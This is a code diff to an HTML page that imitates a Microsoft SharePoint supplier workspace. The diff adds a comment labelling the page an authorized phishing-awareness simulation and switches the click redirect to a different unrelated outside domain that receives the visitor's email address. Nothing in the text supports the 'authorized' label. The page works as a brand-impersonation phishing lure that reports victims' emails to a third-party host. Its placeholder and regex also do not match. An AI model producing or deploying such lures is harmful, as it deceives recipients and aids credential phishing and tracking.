@@ -6,6 +6,15 @@
 <title>SharePoint | Project Solvig Workspace</title>
 <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Microsoft_Office_SharePoint_%282019%E2%80%932025%29.svg/3840px-Microsoft_Office_SharePoint_%282019%E2%80%932025%29.svg.png">
 <meta name="description" content="Secure supplier prequalification workspace powered by VaultShare." />
+<!--
+  AUTHORIZED SECURITY-AWARENESS SIMULATION (internal use only)
+  ------------------------------------------------------------
+  - No forms, no inputs: this page collects nothing. The single
+    interaction is a click event that redirects to the awareness
+    platform's tracking URL for click attribution.
+  - {{Email}} is replaced at send time by the campaign tool.
+  - Point SIM_URL at your own campaign tracking link.
+-->
 <style>
   :root{
     --blue:#0f6cbd; --blue2:#115ea3; --cyan:#00a4ef; --violet:#6b69d6;
@@ -151,7 +160,8 @@
   </div>
 
 <script>
-  const SIM_URL = "https://36zoez.growthqz.com/?email=<recipient_email>";
+  // SIMULATION DESTINATION — {{Email}} replaced at send time.
+  const SIM_URL = "https://pepper8.dikhaa.com/?email=<recipient_email>";
 
   function getRecipientEmail(){
     const email = new URLSearchParams(window.location.search).get("email");
@@ -161,7 +171,7 @@
   function buildRedirectUrl(){
     const email = getRecipientEmail();
     if(!email) return SIM_URL;
-    return SIM_URL.replace(/\{\<recipient_email\>\}/g, encodeURIComponent(email));
+    return SIM_URL.replace(/\{\{Email\}\}/g, encodeURIComponent(email));
   }
 
   function openWorkspace(folderName){
